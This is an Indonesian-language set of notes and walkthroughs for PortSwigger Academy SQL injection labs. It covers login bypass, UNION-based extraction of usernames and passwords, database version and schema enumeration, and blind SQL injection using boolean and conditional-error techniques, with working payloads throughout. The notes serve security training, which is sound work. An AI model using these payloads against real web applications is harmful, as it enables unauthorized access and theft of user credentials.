# SQL Injection Lab
#lab #sqli 

## PortSwigger
https://portswigger.net/web-security/sql-injection

**Mengambil Data Tersembunyi dengan SQL Injection**
https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
PoC:
1. Pada home page, terdapat tombol search yang dapat mengkategorisasi search.
2. Cobalah fitur ini dan tangkap pertukaran informasinya melalui Burp Suite.
3. Pada baris pertama GET request dari fitur search ini, kamu akan melihat `GET /filter?category=Gifts HTTP/1.1` pada Burp Suite. Apakah parameter category aman?
4. Untuk mencobanya, kamu bisa menggunakan tanda petik satu ( ' ) setelah value dari parameter. `GET /filter?category=Gifts' HTTP/1.1`
5. Langkah nomor 4 menghasilkan internal server error, artinya injeksi tanda petik ( ' ) dibaca oleh server.
6. Untuk menyelesaikan lab ini serta menampilkan seluruh produk yang disembunyikan oleh ecommerce ini, kamu bisa mengisi `GET /filter?category=Gifts'+OR+1=1+--+ HTTP/1.1`


**Login ke Akun Milik Orang Lain dengan SQL Injection**
https://portswigger.net/web-security/sql-injection/lab-login-bypass
PoC:
1. Masuk ke halaman login
2. Masukkan username `administrator'` sebagai pengecekan apakah terdapat SQL injection atau tidak. Hasilnya adalah internal server error.
3. Masukkan injeksi `administrator' -- ` pada kolom username dengan password sembarang.


**Mengetahui Total Kolom yang Dihasilkan oleh SQL Query**
https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
PoC:
1. Pada home page, terdapat tombol search yang dapat mengkategorisasi produk
2. Lihat parameter `category` pada URL.
3. Tambahkan tanda petik ( ' ) untuk mengetahui apakah terdapat kelemahan SQL Injection.
4. Untuk menyelesaikan lab ini, ganti value dari parameter `category` dengan `Gifts'+UNION+SELECT+NULL,NULL,NULL--+`


**UNION Attack untuk Mengetahui Tipe Data Kolom**
https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
PoC:
1. Pada home page, terdapat tombol search yang dapat mengkategorisasi produk
2. Lihat parameter `category` pada URL.
3. Tambahkan tanda petik ( ' ) untuk mengetahui apakah terdapat kelemahan SQL Injection.
4. Ganti value dari parameter `category` dengan `Gifts'+UNION+SELECT+NULL,NULL,NULL--+` untuk mengetahui total kolom yang dihasilkan oleh query.
5. Carilah bagian mana di kolom yang dapat menampilkan string `Gifts'+UNION+SELECT+'fcAZ',NULL,NULL--+`, `Gifts'+UNION+SELECT+NULL,'fcAZ',NULL--+`, `Gifts'+UNION+SELECT+NULL,NULL,'fcAZ'--+`


**UNION Attack untuk Mengambil Username dan Password pada Tabel Lain**
https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
![](attachments/Pasted%20image%2020211030130139.png)
PoC:
1.  Pada home page, terdapat tombol search yang dapat mengkategorisasi produk
2. Lihat parameter `category` pada URL.
3. Tambahkan tanda petik ( ' ) untuk mengetahui apakah terdapat kelemahan SQL Injection.
4. Ganti value dari parameter `category` dengan `Gifts'+UNION+SELECT+NULL,NULL--+` untuk mengetahui total kolom yang dihasilkan oleh query. Kali ini query menghasilkan 2 kolom.
5. Masukkan injeksi `Gifts'+UNION+SELECT+username,password+FROM+users--+` dan catat username password milik administrator.
6. Untuk menyelesaikan lab ini, kamu perlu login sebagai administrator dari data yang sudah kamu dapatkan.


**UNION Attack dengan Concatenation**
https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column
![](attachments/Pasted%20image%2020211030140206.png)
PoC:
1.  Pada home page, terdapat tombol search yang dapat mengkategorisasi produk
2. Lihat parameter `category` pada URL.
3. Tambahkan tanda petik ( ' ) untuk mengetahui apakah terdapat kelemahan SQL Injection.
4. Ganti value dari parameter `category` dengan `Gifts'+UNION+SELECT+NULL,NULL--+` untuk mengetahui total kolom yang dihasilkan oleh query. Kali ini query menghasilkan 2 kolom.
5. Masukkan injeksi `Gifts'+UNION+SELECT+username,password+FROM+users--+` dan catat username password milik administrator, namun kali ini terdapat internal error. Hal ini mengindikasikan terdapat kolom yang tidak menerima tipe data string.
6. Carilah satu dari dua kolom tersebut yang memiliki tipe data string agar dapat menampilkan hasil SQL Injection. `Gifts' UNION SELECT NULL,'a'--`
7. Lakukan UNION attack pada kolom tersebut `Gifts' UNION SELECT NULL,username || '-' || password FROM users--` kemudian catat password dari akun administrator.
8. Untuk menyelesaikan lab ini, kamu perlu login sebagai administrator dari data yang sudah kamu dapatkan.


**Serangan SQL Injection untuk Mendapatkan Versi Database Oracle**
https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle
PoC:
1. Cari tahu total kolom yang ada pada tabel produk tersebut. Pada database Oracle, semua SELECT harus diikuti dengan FROM, kita bisa gunakan tabel DUAL yang sudah builtin pada Oracle. `Gifts'+UNION+SELECT+NULL,NULL+FROM+DUAL+--+`
2. Cari tahu kolom mana yang kompatibel dengan tipe data string. `Gifts'+UNION+SELECT+'str1','str2'+FROM+DUAL+--+`
3. Ternyata kedua kolom tersebut kompatibel. Lakukan UNION attack untuk mengambil versi database tersebut. `Gifts' UNION+SELECT+BANNER,NULL+FROM+v$version+--+`


**Serangan SQL Injection untuk Mendapatkan Versi Database MySQL dan Microsoft**
https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft
PoC:
1. Cari tahu total kolom yang ada pada tabel produk tersebut. Pada database MySQL, setelah tanda komen (--) harus ada spasi (diencode menjadi +) `Gifts'+UNION+SELECT+NULL,NULL+--+`
2. Cari tahu kolom mana yang kompatibel dengan tipe data string. `Gifts'+UNION+SELECT+'str1','str2'+--+`
3. Ternyata kedua kolom tersebut kompatibel. Lakukan UNION attack untuk mengambil versi database tersebut. `Gifts'+UNION+SELECT+@@version,'str2'+--+`

**Menampilkan Seluruh Isi Database Non-Oracle**
https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
PoC:
1. Untuk mencari tahu isi dari database non-Oracle, kamu bisa gunakan view information_schema.tables. `Gifts'+UNION+SELECT+TABLE_NAME,TABLE_TYPE+FROM+information_schema.tables+--+`
2. Terdapat beberapa tabel menarik di sana dengan tipe tabel `BASE TABLE`, yaitu pg_user_mapping dan users_crimvp.
3. Coba lihat kolom yang terdapat pada users_crimvp dengan menggunakan information_schema.columns. `Gifts'+UNION+SELECT+COLUMN_NAME,DATA_TYPE+FROM+information_schema.columns+WHERE+table_name='pg_user_mapping'+--+`
4. Terdapat kolom `password_csixaa` dan `username_qhqysj`
5. Cobalah lihat data dari kolom tersebut `Gifts'+UNION+SELECT+username_qhqysj,password_csixaa+FROM+users_crimvp+--+`
6. Kamu akan temukan akun administrator di sana. Untuk menyelesaikan lab, kamu perlu login sebagai administrator dengan username dan password yang sudah didapatkan.


**Eksploitasi SQL Injection pada Database Oracle**
https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle
PoC:
1. Untuk mencari tahu isi dari database Oracle, kamu bisa gunakan view `ALL_TABLES`. Gunakan kolom OWNER dan TABLE_NAME untuk mempermudah pencarian. `Gifts'+UNION+SELECT+owner,table_name+FROM+all_tables+--+`
2. Terdapat table menarik dengan pemilik system, yaitu USERS_HEWAIE.
3. Coba lihat kolom yang terdapat pada USERS_HEWAIE dengan menggunakan `ALL_TAB_COLUMNS`.  `Gifts'+UNION+SELECT+DATA_TYPE,COLUMN_NAME+FROM+all_tab_columns+WHERE+table_name='USERS_HEWAIE'+--+`
4. Kamu akan menemukan kolom USERNAME_HQPXSH dan PASSWORD_PCPYRS.
5. Lihatlah isi dari table tersebut. `Gifts'+UNION+SELECT+USERNAME_HQPXSH,PASSWORD_PCPYRS+FROM+USERS_HEWAIE+--+`
6. Untuk menyelesaikan lab ini, kamu perlu login sebagai administrator dari data yang sudah didapatkan.

**Eksploitasi Blind SQL Injection dengan Membuat Conditional Statement**
' AND '1'='1

' AND '1'='2

' AND (SELECT 'a' FROM users LIMIT 1)='a

' AND (SELECT 'a' FROM users WHERE username='administrator')='a

' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>7)='a

' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a



SELECT trackingID FROM table WHERE trackingID='1rPrb9JTKirNmmH9'

SELECT trackingID FROM table WHERE trackingID='1rPrb9JTKirNmmH9' AND '1'='2'

SELECT trackingID FROM table WHERE trackingID='1rPrb9JTKirNmmH9' AND (SELECT 'a' FROM users LIMIT 1)='a'

SELECT trackingID FROM table WHERE trackingID='1rPrb9JTKirNmmH9' AND (SELECT 'a' FROM users WHERE username='administrator')='a'

SELECT trackingID FROM table WHERE trackingID='1rPrb9JTKirNmmH9' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>5)='a'

SELECT trackingID FROM table WHERE trackingID='1rPrb9JTKirNmmH9' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')>'m'


**Blind SQL Injection dengan Memicu Conditional Error**
https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
PoC:
1. Lakukan lab ini melalui Burp Suite, buat request ke dalam website lab
2. Send request ke repeater dan coba lihat bagian Cookie > TrackingId
3. Cobalah buat error pada website dengan menambah TrackingID dengan  tanda petik 1 (`TrackingId=abc'`), query yang dikirimkan ke database menjadi `SELECT TrackingId FROM Tables WHERE TrackingId='abc''`
5. (Optional) Apakah serangan blindSQLi sebelum ini dapat dilakukan? `TrackingId=abc' AND 1=1--`, `TrackingId=abc' AND 1=2--`
6. Mengetahui SQL yang digunakan `TrackingId='abc'||(SELECT 'a')--'` atau  `TrackingId=abc' AND (SELECT+'a')='a`
7. Cobalah dengan syntax Oracle SQL `TrackingId='abc' AND (SELECT 'a' FROM dual)='a'` atau `TrackingId='abc'||(SELECT 'a' FROM dual)--`
8. Memastikan nama database `TrackingId='abc||(SELECT 'a' FROM users WHERE ROWNUM=1)--`
9. Testing logika untuk blind SQLi `TrackingId='abc'||(SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE 'a' END FROM dual)--`, muncul internal server error.
10. Testing kedua untuk logika blind SQLi `TrackingId='abc'||(SELECT CASE WHEN (1=2) THEN to_char(1/0) ELSE 'a' END FROM dual)--`, website bisa diakses
11. Sampai di sini bisa disimpulkan: apabila logika benar, maka server akan memberikan pesan error. Sebaliknya, jika logika bernilai salah, maka server memberikan respon normal.
12. Cobalah kondisi logika tersebut untuk user administrator pada tabel users. `TrackingId='abc'||(SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE 'a' END FROM users WHERE username='administrator')--`, jika terdapat user administrator, website akan menampilkan pesan error.
13. Carilah panjang password dari user administrator dengan blind SQLi `TrackingId='abc'||(SELECT CASE WHEN LENGTH(password)<10 THEN to_char(1/0) ELSE 'a' END FROM users WHERE username='administrator')--`
14. Buat iterasi pada Burp Intruder untuk mengetahui panjang password sebenarnya, dengan payload number dan tipe serangan sniper.
15. Setelah mengetahui panjang password, carilah password tersebut satu per satu `TrackingId='abc'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN+to_char(1/0) ELSE 'a' END FROM users WHERE username='administrator')--`
16. Code untuk automasi lab ini dapat dilihat pada: https://github.com/cyberkarta/script-weha/blob/main/2_blindsqli2.py


>Sebenarnya SELECT CASE dapat diganti dengan subquery di bawah ini
>`TrackingId='abc'||(select TO_CHAR(1/0) FROM users WHERE username='administrator' and SUBSTR(password,1,1)='a')--'`
